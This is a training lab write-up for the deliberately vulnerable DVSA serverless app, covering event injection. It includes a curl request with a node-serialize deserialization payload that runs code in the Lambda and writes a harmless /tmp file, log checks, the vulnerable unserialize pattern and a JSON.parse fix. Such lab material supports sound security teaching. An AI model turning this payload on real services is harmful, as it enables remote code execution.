# Lesson 01 - Event Injection

> Run only inside your own DVSA lab deployment. Replace placeholders with your API Gateway URL. Do not include real JWTs or AWS keys in GitHub.

## Environment

```bash
export API="https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/order"
```

## Endpoint sanity check

```bash
curl -v "$API" \
  -H "content-type: application/json" \
  --data '{"action":"test"}'
```

## Controlled vulnerable request

The report screenshot shows a `node-serialize` style payload. A safe repository version is kept with placeholders and a harmless `/tmp` file proof:

```bash
curl -s "$API" \
  -H "content-type: application/json" \
  --data '{"action":"_$$ND_FUNC$$_function(){var fs=require(\"fs\");fs.writeFileSync(\"/tmp/hacked.txt\",\"HACKED\");var data=fs.readFileSync(\"/tmp/hacked.txt\",\"utf8\");console.error(\"YOU GOT: \"+data);}()","cart-id":"lab-cart"}'
```

## CloudWatch verification

Open CloudWatch Logs for:

```text
/aws/lambda/DVSA-ORDER-MANAGER
```

Expected pre-fix evidence:

```text
YOU GOT: HACKED
```

## Fix shown in screenshots

Vulnerable pattern:

```javascript
const serialize = require('node-serialize');
var req = serialize.unserialize(event.body);
var headers = serialize.unserialize(event.headers);
```

Fixed pattern:

```javascript
let req = {};
let headers = event.headers || {};

try {
  req = JSON.parse(event.body || "{}");
} catch (e) {
  const response = {
    statusCode: 400,
    headers: { "Access-Control-Allow-Origin": "*" },
    body: JSON.stringify({ "status": "err", "msg": "invalid json" })
  };
  return callback(null, response);
}
```

## Post-fix verification

Repeat the same controlled payload and verify that the CloudWatch message no longer appears.
